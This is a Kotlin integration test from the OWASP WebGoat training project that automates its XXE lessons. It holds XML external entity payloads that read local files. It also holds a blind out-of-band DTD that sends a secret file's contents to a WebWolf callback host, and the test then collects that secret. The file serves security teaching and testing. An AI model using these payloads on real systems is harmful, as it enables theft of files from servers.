/*
 * SPDX-FileCopyrightText: Copyright © 2019 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration

import io.restassured.RestAssured
import io.restassured.http.ContentType
import org.junit.jupiter.api.Test

class XXEIntegrationTest : IntegrationTest() {
    companion object {
        private const val XXE3 = """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>
"""
        private const val XXE4 = """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>
"""
        private const val DTD7 = """<?xml version="1.0" encoding="UTF-8"?><!ENTITY % file SYSTEM "file:SECRET"><!ENTITY % all "<!ENTITY send SYSTEM 'WEBWOLFURL?text=%file;'>">%all;
"""
        private const val XXE7 = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM "WEBWOLFURL/USERNAME/blind.dtd">%remote;]><comment><text>test&send;</text></comment>
"""
    }

    private var webGoatHomeDirectory: String = ""

    /**
     * This performs the steps of the exercise before the secret can be committed in the final step.
     */
    private fun getSecret(): String {
        val secretFile = "$webGoatHomeDirectory/XXE/$user/secret.txt"
        val webWolfCallback = webWolfUrlConfig.url("landing")
        val dtd7String = DTD7.replace("WEBWOLFURL", webWolfCallback).replace("SECRET", secretFile)

        // upload DTD
        RestAssured
            .given()
            .`when`()
            .relaxedHTTPSValidation()
            .cookie("WEBWOLFSESSION", webWolfCookie)
            .multiPart("file", "blind.dtd", dtd7String.toByteArray())
            .post(webWolfUrlConfig.url("fileupload"))
            .then()
            .extract()
            .response()
            .body
            .asString()

        // upload attack
        val xxe7String =
            XXE7
                .replace("WEBWOLFURL", webWolfUrlConfig.url("files"))
                .replace("USERNAME", user)
        checkAssignment(webGoatUrlConfig.url("xxe/blind"), ContentType.XML, xxe7String, false)

        // read results from WebWolf
        var result =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("WEBWOLFSESSION", webWolfCookie)
                .get(webWolfUrlConfig.url("requests"))
                .then()
                .extract()
                .response()
                .body
                .asString()
        result = result.replace("%20", " ")
        if (result.lastIndexOf("WebGoat 8.0 rocks... (") != -1) {
            result =
                result.substring(
                    result.lastIndexOf("WebGoat 8.0 rocks... ("),
                    result.lastIndexOf("WebGoat 8.0 rocks... (") + (21 + user.length),
                )
        }
        return result
    }

    @Test
    fun runTests() {
        startLesson("XXE", true)
        webGoatHomeDirectory = webGoatServerDirectory()
        checkAssignment(webGoatUrlConfig.url("xxe/simple"), ContentType.XML, XXE3, true)
        checkAssignment(webGoatUrlConfig.url("xxe/content-type"), ContentType.XML, XXE4, true)
        checkAssignment(
            webGoatUrlConfig.url("xxe/blind"),
            ContentType.XML,
            "<comment><text>${getSecret()}</text></comment>",
            true,
        )
        checkResults("XXE")
    }
}
